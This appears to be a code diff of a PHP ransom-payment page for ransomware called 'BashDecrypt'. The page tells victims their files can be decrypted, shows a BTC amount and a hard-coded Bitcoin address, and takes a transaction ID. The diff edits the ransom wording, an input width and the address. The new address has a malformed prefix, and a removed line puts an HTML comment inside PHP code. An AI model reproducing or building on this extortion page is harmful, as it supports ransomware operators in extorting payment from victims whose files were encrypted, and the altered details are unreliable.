@@ -29,7 +29,6 @@ $getExpTime = "";
 if (isset($_GET['trans_id']) && !empty($_GET['trans_id'])) {
    if (strlen($_GET['trans_id']) == 64) {
       echo "<script>alert(\"Your transaction id has been confirmed, Please wait!\");</script>";
-      <!-- redirect page with script download instructions -->
    } else {
       echo "<script>alert(\"Your transaction id could not be confirmed, Please try again!\");</script>";
    } 
@@ -162,7 +161,7 @@ if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
   <table style="padding-left: 1em; padding-right: 1em; background: white;border-radius:10px;-moz-border-radius:10px;-webkit-border-radius:10px;">
     <tr>
       <td align="center">
-        We present a special software, called BashDecrypt, which allows you to decrypt your files and return control of your system back to you.
+        We present a special software, called BashDecrypt that allows you to decrypt your files.
       </td>
     </tr>
     <tr>
@@ -215,7 +214,7 @@ if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
     </tr>
     <tr>
       <td align="left" style="color: #000000; background-color: #32CD32">
-        3. <b>Send <font color="#8B0000"><?php echo $bitcoinValue; ?></font> BTC to Bitcoin address:     <font color="#8B0000">1Lq24MSC9jB6DgQWZ917kFapajwNMifpgT</font></b>
+        3. <b>Send <font color="#8B0000"><?php echo $bitcoinValue; ?></font> BTC to Bitcoin address:     <font color="#8B0000">10Lq24MSC9jB6DgQWZ917kFapajwNMifpgT</font></b>
       </td>
     </tr> 
     <tr>
@@ -225,7 +224,7 @@ if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
     </tr>
     <tr>
       <td align="left" style="color: #000000; background-color: #32CD32">
-          4. <b>Enter the Transaction ID: <input size="75" id="trans_id" type="text"> Amount: <?php echo $bitcoinValue; ?></b>
+          4. <b>Enter the Transaction ID: <input size="50" id="trans_id" type="text"> Amount: <?php echo $bitcoinValue; ?></b>
           <br />
           <font size="2"><b>Transaction ID - You can find this information in your transaction details</b></font>
       </td>
